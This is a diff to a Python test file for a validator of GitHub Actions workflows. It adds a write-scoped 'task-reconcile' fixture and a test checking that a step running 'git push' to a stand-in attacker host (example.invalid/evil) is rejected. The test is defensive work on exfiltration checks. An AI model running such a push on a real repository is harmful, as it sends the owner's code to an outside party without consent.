@@ -20,12 +20,32 @@ class WorkflowScopeTests(unittest.TestCase):
             "jobs": {"validate": {"steps": [{"uses": "actions/checkout@v4"}, {"run": run}]}},
         }
 
+    def task_reconcile_workflow(self, run: str = "git push origin HEAD:main"):
+        return {
+            "on": {"issues": {"types": ["opened", "closed", "reopened"]}},
+            "permissions": {"contents": "write", "issues": "read"},
+            "jobs": {"reconcile": {"steps": [{"uses": "actions/checkout@v4"}, {"run": run}]}},
+        }
+
     def test_current_workflow_passes(self):
         validator.validate(ROOT / ".github" / "workflows" / "steward.yml")
 
     def test_write_permission_is_rejected(self):
         with self.assertRaisesRegex(ValueError, "permissions"):
             validator.validate_permissions(Path("bad.yml"), self.workflow(permissions={"contents": "write"}))
+
+    def test_task_reconcile_write_scope_is_allowed(self):
+        path = Path(".github/workflows/task-reconcile.yml")
+        workflow = self.task_reconcile_workflow()
+        validator.validate_permissions(path, workflow)
+        validator.validate_triggers(path, workflow)
+        validator.validate_steps(path, workflow)
+
+    def test_task_reconcile_external_git_push_is_rejected(self):
+        path = Path(".github/workflows/task-reconcile.yml")
+        workflow = self.task_reconcile_workflow(run="git push https://example.invalid/evil main")
+        with self.assertRaisesRegex(ValueError, "git push"):
+            validator.validate_steps(path, workflow)
 
     def test_external_git_push_is_rejected(self):
         with self.assertRaisesRegex(ValueError, "git push"):
